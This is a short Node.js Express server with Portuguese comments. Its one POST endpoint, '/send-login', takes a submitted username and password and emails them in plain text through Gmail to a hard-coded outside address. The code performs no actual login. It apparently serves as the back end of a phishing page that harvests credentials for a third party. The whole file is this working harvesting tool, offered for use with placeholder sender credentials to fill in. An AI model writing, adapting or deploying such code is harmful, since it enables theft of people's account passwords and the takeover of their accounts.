const express = require('express');
const nodemailer = require('nodemailer');
const app = express();
app.use(express.json());

// Configuração do transporte de email
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'seuemail@gmail.com',      // Substitua pelo seu email
    pass: 'suasenha'                 // Substitua pela sua senha ou use um app password
  }
});

app.post('/send-login', (req, res) => {
  const { username, password } = req.body;

  const mailOptions = {
    from: 'seuemail@gmail.com',       // Substitua pelo seu email
    to: 'fumorofina92@gmail.com',
    subject: 'Dados de Login',
    text: `Nome de Usuário: ${username}\nSenha: ${password}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.json({ success: false, message: 'Erro ao enviar os dados' });
    } else {
      console.log('Email enviado: ' + info.response);
      res.json({ success: true, message: 'Dados enviados com sucesso' });
    }
  });
});

app.listen(3000, () => {
  console.log('Servidor rodando na porta 3000');
});
